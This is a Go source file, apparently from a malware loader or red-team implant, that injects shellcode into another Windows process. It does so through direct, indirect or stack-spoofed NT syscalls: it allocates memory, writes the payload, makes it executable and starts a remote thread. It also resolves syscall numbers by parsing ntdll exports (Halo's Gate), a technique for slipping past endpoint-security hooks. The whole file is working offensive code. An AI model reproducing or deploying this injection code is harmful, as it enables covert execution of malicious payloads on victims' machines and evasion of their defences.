//go:build windows && !arm64
// +build windows,!arm64

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// syscallInjectManager is lazily initialized to avoid duplicate syscall resolution
var syscallInjectManager *syscallManager

func getInjectManager() *syscallManager {
	if syscallInjectManager == nil {
		syscallInjectManager = newSyscallManager()
	}
	return syscallInjectManager
}

func doSyscallInject(hProc uintptr, sc []byte) error {
	mgr := getInjectManager()

	var getStubFn func(string) (uintptr, error)
	if useIndirectSyscall && useStackSpoofing {
		getStubFn = func(name string) (uintptr, error) {
			s, err := mgr.getSpoofedStub(name)
			if err != nil {
				s, err = mgr.getStub(name)
			}
			return s, err
		}
	} else if useIndirectSyscall {
		getStubFn = func(name string) (uintptr, error) {
			s, err := mgr.getIndirectStub(name)
			if err != nil {
				s, err = mgr.getStub(name)
			}
			return s, err
		}
	} else {
		getStubFn = mgr.getStub
	}

	stubAlloc, err := getStubFn("NtAllocateVirtualMemory")
	if err != nil {
		return fmt.Errorf("get stub NtAllocateVirtualMemory: %w", err)
	}
	defer mgr.freeStubs()

	stubWrite, err := getStubFn("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("get stub NtWriteVirtualMemory: %w", err)
	}
	stubProtect, err := getStubFn("NtProtectVirtualMemory")
	if err != nil {
		return fmt.Errorf("get stub NtProtectVirtualMemory: %w", err)
	}
	stubCreateThread, err := getStubFn("NtCreateThreadEx")
	if err != nil {
		return fmt.Errorf("get stub NtCreateThreadEx: %w", err)
	}
	stubClose, err := getStubFn("NtClose")
	if err != nil {
		return fmt.Errorf("get stub NtClose: %w", err)
	}
	stubWait, err := getStubFn("NtWaitForSingleObject")
	if err != nil {
		return fmt.Errorf("get stub NtWaitForSingleObject: %w", err)
	}

	var allocAddr uintptr
	regionSize := uintptr(len(sc))
	r1, _, _ := syscall.Syscall6(stubAlloc, 6,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
	}

	var written uint32
	r1, _, _ = syscall.Syscall6(stubWrite, 5,
		hProc,
		allocAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r1 != 0 {
		syscall.Syscall6(stubAlloc, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
	}

	var oldProt uint32
	r1, _, _ = syscall.Syscall6(stubProtect, 5,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProt)),
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
	}

	var hThread uintptr
	r1, _, _ = syscall.Syscall12(stubCreateThread, 11,
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,  // DesiredAccess
		0,         // ObjectAttributes
		hProc,     // ProcessHandle
		allocAddr, // StartAddress
		0,         // Argument
		0,         // CreateFlags
		0,         // ZeroBits
		0,         // StackSize (default)
		0,         // MaxStackSize (default)
		0,         // AttributeList (NULL)
		0,         // padding
	)
	if r1 != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: 0x%X (shellcode at 0x%X)", r1, allocAddr)
	}

	syscall.Syscall6(stubWait, 2, hThread, 0, 0xFFFFFFFF, 0, 0, 0)
	syscall.Syscall6(stubClose, 1, hThread, 0, 0, 0, 0, 0)
	return nil
}

// findSyscallNum finds the SSN for a given NT API by parsing ntdll export table.
// This is the legacy approach used by syscall_stubs_windows.go as fallback.
func findSyscallNum(funcName string) (uint32, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	// Parse ntdll DOS header for SSN extraction via Halo's Gate
	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}

	// Map ntdll NT headers to access export directory
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	// Map export directory to enumerate function RVAs and name table
	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
	if exportDir.virtualAddress == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))

	// Map export table arrays: functions RVA, names RVA, and name ordinals
	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))

	for i := uint32(0); i < exp.numberOfNames; i++ {
		namePtr := base + uintptr(nameArray[i])
		var name string
		for j := 0; ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			name += string(c)
		}
		if name == funcName {
			ord := ordArray[i]
			funcRVA := funcArray[ord]
			funcAddr := base + uintptr(funcRVA)

			// Read function code bytes to find "mov eax, SSN" (0xB8) + "syscall" (0x0F 0x05)
		code := (*[32]byte)(unsafe.Pointer(funcAddr))[:]
			for k := 0; k < len(code)-5; k++ {
				if code[k] == 0xB8 {
					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
						if code[j] == 0x0F && code[j+1] == 0x05 {
							return ssn, nil
						}
					}
				}
			}
			return 0, fmt.Errorf("syscall pattern not found in %s", funcName)
		}
	}
	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
}
